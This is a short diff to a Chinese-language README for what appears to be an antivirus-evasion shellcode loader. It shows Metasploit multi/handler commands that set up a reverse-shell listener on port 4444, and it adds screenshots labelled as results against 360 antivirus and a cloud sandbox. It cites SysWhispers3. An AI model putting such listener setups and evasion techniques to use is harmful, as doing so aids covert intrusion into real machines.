@@ -32,7 +32,11 @@ msf6 exploit(multi/handler) > set lport 4444
 msf6 exploit(multi/handler) > run
 ```
 
+360核晶截图
 ![360demo](https://user-images.githubusercontent.com/128464183/226871711-0ba4d10c-188e-46de-8c4c-fd7b3693f604.PNG)
+
+微步云沙箱截图
+![image](https://user-images.githubusercontent.com/128464183/227158488-1e5434e8-1532-436d-974f-a320d754691e.png)
 
 ## 0x04 参考：
 https://github.com/klezVirus/SysWhispers3
